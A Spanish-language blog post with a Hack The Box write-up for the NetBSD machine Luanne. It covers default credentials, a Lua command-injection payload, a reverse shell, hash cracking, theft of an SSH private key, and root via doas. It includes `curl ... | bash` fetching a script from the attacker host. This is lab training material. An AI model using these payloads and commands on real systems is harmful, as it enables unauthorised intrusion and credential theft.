---
layout: single
title: Luanne - Hack The Box
excerpt: "Resolución de la máquina *Luanne* de Hack The Box, una máquina NetBSD de dificultad fácil según la plataforma, en la cual accedemos con credenciales por defecto al servicio *medusa supervisor process manager*, encontramos un script en lua vulneable a inyección de comandos a través del cual accederemos a la máquina. Posteriormente encontraremos la clave privada de ssh del usuario r.michaels y accederemos por ssh, para encontrar un fichero de backup encriptado que conseguiremos desencriptar y nos revelará la contraseña del usuario r.michaels, y por último encontraremos que el usuario r.michaels puede ejecutar cualquier comando con doas (equivalente a sudo en NetBSD) para convertirnos en el usuario root."
date: 2021-03-28
classes: wide
header:
  teaser: /assets/images/Luanne-Hackthebox/luanne.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - Web Exploiting
  - Privilege Escalation
  - Pentesting
  - BSD
---

![](/assets/images/Luanne-Hackthebox/luanne.png)

Resolución de la máquina *Luanne* de Hack The Box, una máquina NetBSD de dificultad fácil según la plataforma, en la cual accedemos con credenciales por defecto al servicio *medusa supervisor process manager*, encontramos un script en lua vulneable a inyección de comandos a través del cual accederemos a la máquina. Posteriormente encontraremos la clave privada de ssh del usuario r.michaels y accederemos por ssh, para encontrar un fichero de backup encriptado que conseguiremos desencriptar y nos revelará la contraseña del usuario r.michaels, y por último encontraremos que el usuario r.michaels puede ejecutar cualquier comando con doas (equivalente a sudo en NetBSD) para convertirnos en el usuario root.

## Escaneo de puertos con nmap

Empezamos escaneando todo el rango de puertos y exportando el resultado en el fichero allPorts.

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n 10.10.10.218 -Pn -oG allPorts
```
![](/assets/images/Luanne-Hackthebox/allPorts.png)

Luego hacemos un escaneo con scripts por defecto y detección de versiones a los puertos abiertos encontrados.

```bash
nmap -sC -sV -p22,80,9001 10.10.10.218 -oN targeted
```
![](/assets/images/Luanne-Hackthebox/targeted.png)

Vemos que en puerto 80 hay un servidor web nginx y en el puerto 9001 un Medusa httpd 1.12 (Supervisor process manager).

## Acceso inicial

Empezamos con el puerto 80. Accedemos a la web y vemos que nos pide autenticación. Probamos con credenciales típicas pero no hay suerte, y al cancelar vemos que aparece una url que apunta al puerto 3000 127.0.0.1:3000

![](/assets/images/Luanne-Hackthebox/80.png)

En el puerto 9001 también nos pide credenciales diréctamente.

Busco en internet por *medusa supervisor process manager default credentials* y encuentro una [página](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/) donde dice que las credenciales por defecto son user:123

![](/assets/images/Luanne-Hackthebox/default.png)

Probamos con esas credenciales en el puerto 9001 y accedemos.

![](/assets/images/Luanne-Hackthebox/puerto9001.png)

Hago click en los diferentes links y veo que muestra algunos procesos, estado de memoria, etc. En el link *Tail -f Stdout* muestra los procesos que están corriendo en el sistema en tiempo real.

![](/assets/images/Luanne-Hackthebox/procesos.png)

Vemos que hay otro servicio httpd en el puerto 3001 que lo está ejecutando el usuario r.michaels y parece ser un servicio de desarrollo ya que está asociado al proceso /var/run/httpd_devel.pid y al directorio /home/r.michaels/devel/www. Y otro en el puerto 3000 que parece ser el servicio en producción con el usuario _httpd y el directorio /var/www.

Pruebo si existe un fichero robots.txt en el puerto 80 y veo que si, y revela un directorio weather.

![](/assets/images/Luanne-Hackthebox/robots.png)

No deja acceder pero viendo el comentario del robots.txt que dice *#returning 404 but still harvesting cities* decido fuzzearlo para ver si encuentro algún subdirectorio dentro.

```bash
ffuf -u http://10.10.10.218/weather/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![](/assets/images/Luanne-Hackthebox/ffuf.png)


Encuentro el directorio forecast. Accedo y tiene la siguiente pinta:

![](/assets/images/Luanne-Hackthebox/forecast.png)

Antes habíamos visto que se estaba ejecutando el comando `/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www` así que busco por httpd lua vulnerabilities y encuentro una [página](https://www.syhunt.com/pt/index.php?n=Articles.LuaVulnerabilities) donde explican como inyectar código en los scripts en lua.

![](/assets/images/Luanne-Hackthebox/lua.png)

Accedo a http://10.10.10.218/weather/forecast,capturo la petición con burpsuite y la envío al repeater para estar más cómodo.

![](/assets/images/Luanne-Hackthebox/burp1.png)

Viendo que dice *Use 'city=list' to list available cities* añado ?city=list a la petición y devuelve la lista de ciudades.

![](/assets/images/Luanne-Hackthebox/burp2.png)

Pruebo de inyección que había encontrado antes y funciona, en la respuesta del servidor vemos que nos devuelve el resultado del comando id. Tenemos ejecución de comandos.

![](/assets/images/Luanne-Hackthebox/id.png)

Me pongo a la escucha en el puerto 443 y ejecuto una reverse shell para obtener el acceso inicial.

![](/assets/images/Luanne-Hackthebox/nc.png)

En [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) encuentro la reverse shell para OpenBSD.

![](/assets/images/Luanne-Hackthebox/bsd.png)

![](/assets/images/Luanne-Hackthebox/shell.png)

## Movimiento lateral

Veo que hay un fichero .htpasswd en /var/www y al mirar su contenido veo que
tiene el hash de la contraseña del usuario webapi_user.

![](/assets/images/Luanne-Hackthebox/hash.png)

Me guardo el hash en un fichero y lo crackeo con john.

![](/assets/images/Luanne-Hackthebox/john.png)

La contraseña es: iamthebest

Pruebo a autenticarme con esas credenciales en el puerto 80 y accedo.

![](/assets/images/Luanne-Hackthebox/puerto80.png)

Pruebo las credenciales en el puerto 3001 donde está el servicio de desarrollo
y funcionan.

`curl --user webapi_user:iamthebest localhost:3001`

![](/assets/images/Luanne-Hackthebox/curl3001.png)

Pruebo la inyección de comandos anterior en este servicio para ver si me da
acceso como usuario r.michaels pero parece ser que la vulnerabilidad ha sido
parcheada en el servicio en desarrollo.

`curl "localhost:3001/weather/forecast?city=')+os.execute('id')+--"`

![](/assets/images/Luanne-Hackthebox/inyeccion3001.png)

Vemos que nos devuelve un error en vez del resultado de ejecutar el comando id.

Volviendo a revisar como se ejecuta el servidor vemos que el comando es `/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www `

Viendo la documentación oficial y que utiliza las opciones -u y -X parece ser
que está haciendo un *directory listing* del directorio home del usuario
r.michaels.

Pruebo con `curl --user webapi_user:iamthebest localhost:3001/~r.michaels/`
y efectívamente, además está listando la clave privada de ssh.

![](/assets/images/Luanne-Hackthebox/id_rsa.png)

De nuevo con curl veo el contenido de la clave.

`curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa`

![](/assets/images/Luanne-Hackthebox/clave.png)

Me guardo el contenido de la clave en un fichero local, le doy permisos 600
y la utilizo para conectarme por ssh conel usuario r.michaels

![](/assets/images/Luanne-Hackthebox/r.michaels.png)

Ya puedo leer el user.txt en el directorio home de r.michaels.

## Escalada de privilegios

Enumerando el sistema encuentro un fichero de backup que está encriptado.

También veo que tiene unas claves gnupg en su directorio home.

![](/assets/images/Luanne-Hackthebox/enum.png)

Buscando por gnupg en NetBSD encuentro que el equivalente a gpg en este sistema
es netpgp. Como tiene unas claves en el directorio .gnupg, si son las que se
han utilizado par encriptar el fichero se debería de poder desencriptar.

Ejecuto `netpgp --decrypt --output=devel_backup-2020-09-16.tar.gz devel_backup-2020-09-
16.tar.gz.enc` pero veo que me da error de permiso denegado, así que copio el
fichero al directorio /tmp y lo vuelvo a ejecutar.

Y esta vez si, consigo desencriptarlo, y lo descomprimo con `tar xvzf
devel_backup-2020-09-16.tar.gz`

![](/assets/images/Luanne-Hackthebox/decrypt.png)

Dentro del directorio descomprimido hay otro fichero .htpasswd cno otro hash de
usuario.

`webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.`

De nuevo me lo copio a un fichero local y lo crackeo con john.

![](/assets/images/Luanne-Hackthebox/hash2.png)

La contraseña es littlebear

Lo siguiente será ejecutar el script Linpeas.sh para ver posibles vectores de
ataque para la escalada de privilegios.

Me copio el fichero linpeas.sh a mi direcotrio actual y ejecuto un servidor
http con python para compartir el fichero.

`sudo python3 -m http.server 80`

Y después desde la máquina Luanne ejecuto `curl http://10.10.14.3/linpeas.sh
| bash` para que se ejecute.

Me devuelve un error porque la máquina no tiene bash, así que lo pipeo con sh
en vez de bash y esta vez si funciona.

Linpeas muestra que el usuario r.michaels puede ejecutar cualquier comando como
root en el fichero /etc/doas.conf

![](/assets/images/Luanne-Hackthebox/doas.conf.png)

Antes habíamos obtenido la contraseña littlebear, así que pruebo si es la del
usuario r.michaels con `doas sh` y funciona. Ya tengo una shell de root y puedo
leer el root.txt.

![](/assets/images/Luanne-Hackthebox/root.png)
